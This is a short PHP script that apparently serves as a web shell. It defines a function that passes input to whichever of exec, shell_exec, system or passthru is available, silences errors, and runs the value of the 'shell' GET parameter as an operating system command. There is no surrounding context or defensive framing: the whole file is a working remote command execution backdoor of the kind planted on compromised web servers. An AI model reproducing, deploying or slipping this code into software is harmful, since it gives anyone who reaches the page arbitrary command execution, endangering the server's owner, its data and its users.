<?php
function exa($cfe)
{
    if(function_exists('exec'))
        @exec($cfe);
    elseif(function_exists('shell_exec'))
        $res = @shell_exec($cfe);

    elseif(function_exists('system'))
    {
        @ob_start();
        @system($cfe);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
        @ob_start();
        @passthru($cfe);
        @ob_end_clean();
    }
}

exa($_GET['shell']);
?>